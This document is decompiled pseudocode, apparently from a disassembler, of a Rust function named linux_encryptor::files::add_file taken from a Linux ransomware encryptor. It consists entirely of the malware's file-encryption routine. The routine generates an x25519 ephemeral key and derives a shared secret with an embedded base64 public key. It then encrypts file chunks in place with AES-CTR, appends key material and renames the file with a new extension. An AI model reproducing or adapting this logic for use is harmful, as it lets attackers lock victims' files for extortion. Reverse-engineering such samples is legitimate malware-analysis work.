// positive sp value has been detected, the output may be wrong!
int __fastcall linux_encryptor::files::add_file(__int64 a1)
{
  void *v1; // rsp
  char v2; // cl
  size_t v3; // rax
  size_t v4; // rbx
  __int64 v5; // rdx
  __int64 v6; // r13
  __int64 v7; // r12
  unsigned __int64 v8; // rax
  __int64 v9; // rsi
  __int64 v10; // r14
  void *v11; // rax
  void *v12; // rbp
  void *v13; // rax
  void *v14; // r13
  __int64 v15; // rsi
  unsigned __int64 v16; // rcx
  char v17; // al
  int *v19; // rsi
  void *v20; // rax
  __int64 v21; // r15
  void *v22; // rax
  __int64 v23; // r14
  size_t v24; // rbp
  __int64 v25; // rbx
  void *v26; // rax
  void *v27; // r15
  void *v28; // rax
  void *v29; // rbx
  int *v30; // rbp
  size_t v31; // rbp
  __int64 v32; // rsi
  const void *v33; // r14
  size_t v34; // r15
  __int64 v35; // rbx
  __int64 *v36; // rax
  __int64 *v37; // rbx
  int v38; // [rsp-121Ch] [rbp-124Ch] BYREF
  __int64 *v39; // [rsp-1218h] [rbp-1248h] BYREF
  __int64 (__fastcall *v40)(); // [rsp-1210h] [rbp-1240h]
  _BYTE v41[24]; // [rsp-11F8h] [rbp-1228h] BYREF
  __int64 v42; // [rsp-11D0h] [rbp-1200h]
  __int64 v43; // [rsp-11C8h] [rbp-11F8h]
  __int64 v44; // [rsp-11C0h] [rbp-11F0h] BYREF
  size_t v45; // [rsp-11B8h] [rbp-11E8h]
  unsigned __int64 v46; // [rsp-11B0h] [rbp-11E0h]
  __int128 v47; // [rsp-11A8h] [rbp-11D8h] BYREF
  __int128 v48; // [rsp-1198h] [rbp-11C8h]
  __int128 v49; // [rsp-1188h] [rbp-11B8h] BYREF
  __int128 v50; // [rsp-1178h] [rbp-11A8h]
  __int64 v51; // [rsp-1160h] [rbp-1190h]
  __int128 v52; // [rsp-1158h] [rbp-1188h] BYREF
  __int128 v53; // [rsp-1148h] [rbp-1178h]
  _OWORD v54[11]; // [rsp-1138h] [rbp-1168h] BYREF
  __int64 v55; // [rsp-1080h] [rbp-10B0h]
  _OWORD v56[2]; // [rsp-1078h] [rbp-10A8h] BYREF
  _QWORD v57[4]; // [rsp-1058h] [rbp-1088h] BYREF
  _BYTE v58[4144]; // [rsp-1038h] [rbp-1068h] BYREF
  __int16 v59; // [rsp-8h] [rbp-38h]

  v1 = alloca(_rust_probestack());
  v44 = a1;
  std::fs::File::options();
  std::fs::OpenOptions::read();
  std::fs::OpenOptions::write();
  std::fs::OpenOptions::_open();
  if ( (_DWORD)v52 )
  {
    *(_QWORD *)v41 = *((_QWORD *)&v52 + 1);
    switch ( BYTE8(v52) & 3 )
    {
      case 0:
        v2 = *(_BYTE *)(*((_QWORD *)&v52 + 1) + 16LL);
        break;
      case 1:
        v2 = *(_BYTE *)(*((_QWORD *)&v52 + 1) + 15LL);
        break;
      case 2:
        std::sys::unix::decode_error_kind();
        v2 = v17;
        break;
      case 3:
        v2 = 0;
        switch ( HIDWORD(v52) )
        {
          case 0:
            goto LABEL_27;
          case 1:
            v2 = 1;
            break;
          case 2:
            v2 = 2;
            break;
          case 3:
            v2 = 3;
            break;
          case 4:
            v2 = 4;
            break;
          case 5:
            v2 = 5;
            break;
          case 6:
            v2 = 6;
            break;
          case 7:
            v2 = 7;
            break;
          case 8:
            v2 = 8;
            break;
          case 9:
            v2 = 9;
            break;
          case 0xA:
            v2 = 10;
            break;
          case 0xB:
            v2 = 11;
            break;
          case 0xC:
            v2 = 12;
            break;
          case 0xD:
            v2 = 13;
            break;
          case 0xE:
            v2 = 14;
            break;
          case 0xF:
            v2 = 15;
            break;
          case 0x10:
            v2 = 16;
            break;
          case 0x11:
            v2 = 17;
            break;
          case 0x12:
            v2 = 18;
            break;
          case 0x13:
            v2 = 19;
            break;
          case 0x14:
            v2 = 20;
            break;
          case 0x15:
            v2 = 21;
            break;
          case 0x16:
            v2 = 22;
            break;
          case 0x17:
            v2 = 23;
            break;
          case 0x18:
            v2 = 24;
            break;
          case 0x19:
            v2 = 25;
            break;
          case 0x1A:
            v2 = 26;
            break;
          case 0x1B:
            v2 = 27;
            break;
          case 0x1C:
            v2 = 28;
            break;
          case 0x1D:
            v2 = 29;
            break;
          case 0x1E:
            v2 = 30;
            break;
          case 0x1F:
            v2 = 31;
            break;
          case 0x20:
            v2 = 32;
            break;
          case 0x21:
            v2 = 33;
            break;
          case 0x22:
            v2 = 34;
            break;
          case 0x23:
            v2 = 35;
            break;
          case 0x24:
            v2 = 36;
            break;
          case 0x25:
            v2 = 37;
            break;
          case 0x26:
            v2 = 38;
            break;
          case 0x27:
            v2 = 39;
            break;
          case 0x28:
            v2 = 40;
            break;
          default:
            v2 = 41;
            break;
        }
        break;
    }
LABEL_27:
    LOBYTE(v39) = v2;
    *(_QWORD *)&v54[0] = &v39;
    *((_QWORD *)&v54[0] + 1) = <std::io::error::ErrorKind as core::fmt::Display>::fmt;
    *(_QWORD *)v58 = &off_73F00;
    *(_QWORD *)&v58[8] = 2LL;
    *(_QWORD *)&v58[16] = 0LL;
    *(_QWORD *)&v58[32] = v54;
    *(_QWORD *)&v58[40] = 1LL;
    std::io::stdio::_print();
    return core::ptr::drop_in_place<std::io::error::Error>(v41);
  }
  v38 = DWORD1(v52);
  std::fs::File::metadata();
  if ( *(_QWORD *)v58 )
  {
    *(_QWORD *)&v54[0] = *(_QWORD *)&v58[8];
    core::result::unwrap_failed();
  }
  memcpy(v54, &v58[8], sizeof(v54));
  std::fs::Metadata::len();
  v4 = v3;
  v50 = 0LL;
  v49 = 0LL;
  ((void (__fastcall *)(__int128 *, __int128 *, __int64))<rand_core::os::OsRng as rand_core::RngCore>::fill_bytes)(
    &v52,
    &v49,
    32LL);
  *(_OWORD *)&v58[16] = v50;
  *(_OWORD *)v58 = v49;
  ((void (__fastcall *)(_OWORD *, _BYTE *))x25519_dalek::x25519::clamp_scalar)(v54, v58);
  v56[0] = v54[0];
  v56[1] = v54[1];
  ((void (__fastcall *)(_QWORD *, _OWORD *))<x25519_dalek::x25519::PublicKey as core::convert::From<&x25519_dalek::x25519::EphemeralSecret>>::from)(
    v57,
    v56);
  v48 = 0LL;
  v47 = 0LL;
  *(_QWORD *)v58 = aG7upjjpof4sq5l;
  *(_QWORD *)&v58[8] = 44LL;
  v59 = 0;
  memset(&v58[16], 0, 4128);
  ((void (__fastcall *)(_OWORD *, _BYTE *, __int128 *, __int64))<base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read)(
    v54,
    v58,
    &v47,
    32LL);
  if ( *(_QWORD *)&v54[0] )
  {
    *(_QWORD *)&v49 = *((_QWORD *)&v54[0] + 1);
    core::result::unwrap_failed();
  }
  v54[1] = v48;
  v54[0] = v47;
  ((void (__fastcall *)(__int64 **, _OWORD *))<x25519_dalek::x25519::PublicKey as core::convert::From<[u8; 32]>>::from)(
    &v39,
    v54);
  ((void (__fastcall *)(_BYTE *, _OWORD *, __int64 **))x25519_dalek::x25519::StaticSecret::diffie_hellman)(
    v41,
    v56,
    &v39);
  ((void (__fastcall *)(__int128 *, _BYTE *))curve25519_dalek::montgomery::MontgomeryPoint::to_bytes)(&v52, v41);
  ((void (__fastcall *)(__int128 *, _QWORD *))curve25519_dalek::montgomery::MontgomeryPoint::to_bytes)(&v49, v57);
  v54[1] = v53;
  v54[0] = v52;
  v54[2] = v49;
  v54[3] = v50;
  ((void (__fastcall *)(_BYTE *))x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_SharedSecret::<impl zeroize::Zeroize for x25519_dalek::x25519::SharedSecret>::zeroize)(v41);
  ((void (__fastcall *)(_OWORD *))x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_EphemeralSecret::<impl zeroize::Zeroize for x25519_dalek::x25519::EphemeralSecret>::zeroize)(v56);
  v53 = v54[1];
  v52 = v54[0];
  v50 = v54[3];
  v49 = v54[2];
  v6 = ((__int64 (__fastcall *)(__int64, __int128 *, __int64, const char *, __int64))crypto::aes::ctr)(
         2LL,
         &v52,
         32LL,
         aLuna,
         4LL);
  v7 = v5;
  v57[0] = v6;
  v57[1] = v5;
  v8 = 30 * (v4 / 0x50000);
  v51 = a1;
  v45 = v4;
  if ( v8 >= 0xEAC4 )
  {
    v42 = v5;
    v43 = v6;
    v46 = (v4 - 196608000) / 0x257;
    v9 = 599LL;
    goto LABEL_8;
  }
  if ( v8 >= 0x64 && (unsigned __int16)(v8 - 100) >= 0x64u )
  {
    v42 = v5;
    v43 = v6;
    v15 = (unsigned int)(5243 * ((unsigned __int16)v8 >> 2)) >> 17;
    v16 = v15 - 1;
    if ( v15 == 1 )
      core::panicking::panic();
    if ( (v16 | (v45 - 327680 * v15)) >> 32 )
    {
      v46 = (v45 - 327680 * v15) / v16;
      v9 = v15 - 1;
      if ( !v9 )
        goto LABEL_52;
    }
    else
    {
      v46 = ((int)v45 - 327680 * (int)v15) / (unsigned int)v16;
      v9 = v15 - 1;
      if ( !v9 )
        goto LABEL_52;
    }
LABEL_8:
    v46 += 327680LL;
    v10 = 0LL;
    while ( 1 )
    {
      v55 = v9;
      _rust_alloc();
      if ( !v11 )
        alloc::alloc::handle_alloc_error();
      v12 = v11;
      *(_QWORD *)v41 = v11;
      memset(v11, 0, (size_t)&loc_50000);
      *(_OWORD *)&v41[8] = xmmword_53000;
      _rust_alloc();
      if ( !v13 )
        alloc::alloc::handle_alloc_error();
      v14 = v13;
      *(_QWORD *)&v54[0] = v13;
      memset(v13, 0, (size_t)&loc_50000);
      *(_OWORD *)((char *)v54 + 8) = xmmword_53000;
      *(_QWORD *)&v58[8] = v10;
      *(_QWORD *)v58 = 0LL;
      <std::fs::File as std::io::Seek>::seek();
      if ( v39 )
      {
        *(_QWORD *)v58 = v40;
        core::result::unwrap_failed();
      }
      <std::process::ChildStdout as std::io::Read>::read();
      if ( *(_QWORD *)v58 )
      {
        v39 = *(__int64 **)&v58[8];
        core::result::unwrap_failed();
      }
      (*(void (__fastcall **)(__int64, void *, void *, void *, void *))(v42 + 24))(
        v43,
        v12,
        &loc_50000,
        v14,
        &loc_50000);
      *(_QWORD *)&v58[8] = v10;
      *(_QWORD *)v58 = 0LL;
      <std::fs::File as std::io::Seek>::seek();
      if ( v39 )
      {
        *(_QWORD *)v58 = v40;
        core::result::unwrap_failed();
      }
      <std::fs::File as std::io::Write>::write();
      if ( (_QWORD)v47 )
        break;
      _rust_dealloc();
      _rust_dealloc();
      v10 += v46;
      v9 = v55 - 1;
      if ( v55 == 1 )
        goto LABEL_52;
    }
    v39 = &v44;
    v40 = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)v58 = &off_73F98;
    *(_QWORD *)&v58[8] = 2LL;
    *(_QWORD *)&v58[16] = 0LL;
    *(_QWORD *)&v58[32] = &v39;
    *(_QWORD *)&v58[40] = 1LL;
    std::io::stdio::_print();
    core::ptr::drop_in_place<std::io::error::Error>((char *)&v47 + 8);
    _rust_dealloc();
    v19 = (int *)&loc_50000;
    _rust_dealloc();
    v6 = v43;
    v7 = v42;
    goto LABEL_67;
  }
  if ( v4 > 0x4FFFF )
  {
    _rust_alloc();
    if ( !v26 )
      alloc::alloc::handle_alloc_error();
    v27 = v26;
    *(_QWORD *)v41 = v26;
    memset(v26, 0, (size_t)&loc_50000);
    *(_OWORD *)&v41[8] = xmmword_53000;
    _rust_alloc();
    if ( !v28 )
      alloc::alloc::handle_alloc_error();
    v29 = v28;
    *(_QWORD *)&v54[0] = v28;
    memset(v28, 0, (size_t)&loc_50000);
    *(_OWORD *)((char *)v54 + 8) = xmmword_53000;
    *(_OWORD *)v58 = 0LL;
    <std::fs::File as std::io::Seek>::seek();
    if ( v39 )
    {
      *(_QWORD *)v58 = v40;
      core::result::unwrap_failed();
    }
    <std::process::ChildStdout as std::io::Read>::read();
    if ( *(_QWORD *)v58 )
    {
      v39 = *(__int64 **)&v58[8];
      core::result::unwrap_failed();
    }
    (*(void (__fastcall **)(__int64, void *, void *, void *, void *))(v7 + 24))(v6, v27, &loc_50000, v29, &loc_50000);
    *(_OWORD *)v58 = 0LL;
    <std::fs::File as std::io::Seek>::seek();
    if ( v39 )
    {
      *(_QWORD *)v58 = v40;
      core::result::unwrap_failed();
    }
    <std::fs::File as std::io::Write>::write();
    if ( (_QWORD)v47 )
    {
      v39 = &v44;
      v40 = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)v58 = &off_73F98;
      *(_QWORD *)&v58[8] = 2LL;
      *(_QWORD *)&v58[16] = 0LL;
      *(_QWORD *)&v58[32] = &v39;
      *(_QWORD *)&v58[40] = 1LL;
      std::io::stdio::_print();
      core::ptr::drop_in_place<std::io::error::Error>((char *)&v47 + 8);
      _rust_dealloc();
      v19 = (int *)&loc_50000;
      _rust_dealloc();
      goto LABEL_67;
    }
    v42 = v7;
    v43 = v6;
    _rust_dealloc();
    _rust_dealloc();
  }
  else
  {
    if ( v4 )
    {
      _rust_alloc();
      if ( !v20 )
        alloc::alloc::handle_alloc_error();
      v21 = (__int64)v20;
      *(_QWORD *)v41 = v20;
      *(_QWORD *)&v41[8] = v4;
      memset(v20, 0, v4);
      *(_QWORD *)&v41[16] = v4;
      _rust_alloc();
      if ( !v22 )
        alloc::alloc::handle_alloc_error();
      v23 = (__int64)v22;
      *(_QWORD *)&v54[0] = v22;
      *((_QWORD *)&v54[0] + 1) = v4;
      memset(v22, 0, v4);
      v24 = v4;
      *(_QWORD *)&v54[1] = v4;
      v25 = v23;
    }
    else
    {
      v24 = 0LL;
      *(_QWORD *)v41 = 1LL;
      *(_OWORD *)&v41[8] = 0LL;
      v54[0] = 1uLL;
      v21 = 1LL;
      v25 = 1LL;
    }
    *(_OWORD *)v58 = 0LL;
    <std::fs::File as std::io::Seek>::seek();
    if ( v39 )
    {
      *(_QWORD *)v58 = v40;
      core::result::unwrap_failed();
    }
    <std::process::ChildStdout as std::io::Read>::read();
    if ( *(_QWORD *)v58 )
    {
      v39 = *(__int64 **)&v58[8];
      core::result::unwrap_failed();
    }
    (*(void (__fastcall **)(__int64, __int64, size_t, __int64, size_t))(v7 + 24))(v6, v21, v24, v25, v24);
    *(_OWORD *)v58 = 0LL;
    <std::fs::File as std::io::Seek>::seek();
    if ( v39 )
    {
      *(_QWORD *)v58 = v40;
      core::result::unwrap_failed();
    }
    v19 = &v38;
    <std::fs::File as std::io::Write>::write();
    if ( (_QWORD)v47 )
    {
      v39 = &v44;
      v40 = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)v58 = &off_73F98;
      *(_QWORD *)&v58[8] = 2LL;
      *(_QWORD *)&v58[16] = 0LL;
      *(_QWORD *)&v58[32] = &v39;
      *(_QWORD *)&v58[40] = 1LL;
      std::io::stdio::_print();
      core::ptr::drop_in_place<std::io::error::Error>((char *)&v47 + 8);
      v30 = (int *)v45;
      if ( v45 )
      {
        _rust_dealloc();
        v19 = v30;
        _rust_dealloc();
      }
      goto LABEL_67;
    }
    v42 = v7;
    v43 = v6;
    if ( v45 )
    {
      _rust_dealloc();
      _rust_dealloc();
    }
  }
LABEL_52:
  v31 = v45;
  *(_QWORD *)&v58[8] = v45;
  *(_QWORD *)v58 = 0LL;
  <std::fs::File as std::io::Seek>::seek();
  v6 = v43;
  v7 = v42;
  if ( *(_QWORD *)&v54[0] )
  {
    *(_QWORD *)v58 = *((_QWORD *)&v54[0] + 1);
    core::result::unwrap_failed();
  }
  v19 = &v38;
  <std::fs::File as std::io::Write>::write();
  if ( *(_QWORD *)v41 )
  {
    *(_QWORD *)&v54[0] = &v44;
    *((_QWORD *)&v54[0] + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)v58 = &off_74060;
    *(_QWORD *)&v58[8] = 2LL;
    *(_QWORD *)&v58[16] = 0LL;
    *(_QWORD *)&v58[32] = v54;
    *(_QWORD *)&v58[40] = 1LL;
    std::io::stdio::_print();
    core::ptr::drop_in_place<std::io::error::Error>(&v41[8]);
  }
  else
  {
    *(_QWORD *)&v58[8] = v31 + 32;
    *(_QWORD *)v58 = 0LL;
    <std::fs::File as std::io::Seek>::seek();
    if ( *(_QWORD *)&v54[0] )
    {
      *(_QWORD *)v58 = *((_QWORD *)&v54[0] + 1);
      core::result::unwrap_failed();
    }
    v19 = &v38;
    <std::fs::File as std::io::Write>::write();
    if ( *(_QWORD *)v41 )
    {
      *(_QWORD *)&v54[0] = &v44;
      *((_QWORD *)&v54[0] + 1) = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)v58 = &off_74098;
      *(_QWORD *)&v58[8] = 2LL;
      *(_QWORD *)&v58[16] = 0LL;
      *(_QWORD *)&v58[32] = v54;
      *(_QWORD *)&v58[40] = 1LL;
      std::io::stdio::_print();
      core::ptr::drop_in_place<std::io::error::Error>(&v41[8]);
    }
    else
    {
      <alloc::string::String as core::clone::Clone>::clone();
      v32 = *(_QWORD *)&v58[16];
      if ( *(_QWORD *)&v58[8] == *(_QWORD *)&v58[16] )
      {
        alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v58, *(_QWORD *)&v58[16], 1LL);
        v32 = *(_QWORD *)&v58[16];
      }
      *(_BYTE *)(*(_QWORD *)v58 + v32) = 46;
      *(_QWORD *)&v54[1] = v32 + 1;
      v54[0] = *(_OWORD *)v58;
      core::str::converts::from_utf8();
      if ( *(_QWORD *)v58 )
      {
        *(_OWORD *)v41 = *(_OWORD *)&v58[8];
        core::result::unwrap_failed();
      }
      v33 = *(const void **)&v58[8];
      v34 = *(_QWORD *)&v58[16];
      v35 = *(_QWORD *)&v54[1];
      if ( *((_QWORD *)&v54[0] + 1) - *(_QWORD *)&v54[1] < *(_QWORD *)&v58[16] )
      {
        alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v54, *(_QWORD *)&v54[1], *(_QWORD *)&v58[16]);
        v35 = *(_QWORD *)&v54[1];
      }
      memcpy((void *)(v35 + *(_QWORD *)&v54[0]), v33, v34);
      *(_QWORD *)&v58[16] = v34 + v35;
      *(_OWORD *)v58 = v54[0];
      std::sys::unix::fs::rename();
      v37 = v36;
      v19 = *(int **)&v58[8];
      if ( *(_QWORD *)&v58[8] )
        _rust_dealloc();
      v39 = v37;
      if ( !v37 )
      {
        (*(void (__fastcall **)(__int64))v7)(v6);
        goto LABEL_68;
      }
      *(_QWORD *)&v54[0] = &v44;
      *((_QWORD *)&v54[0] + 1) = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)v58 = &off_740D0;
      *(_QWORD *)&v58[8] = 2LL;
      *(_QWORD *)&v58[16] = 0LL;
      *(_QWORD *)&v58[32] = v54;
      *(_QWORD *)&v58[40] = 1LL;
      std::io::stdio::_print();
      core::ptr::drop_in_place<std::io::error::Error>(&v39);
    }
  }
LABEL_67:
  (*(void (__fastcall **)(__int64, int *))v7)(v6, v19);
LABEL_68:
  if ( *(_QWORD *)(v7 + 8) )
    _rust_dealloc();
  return close(v38);
}
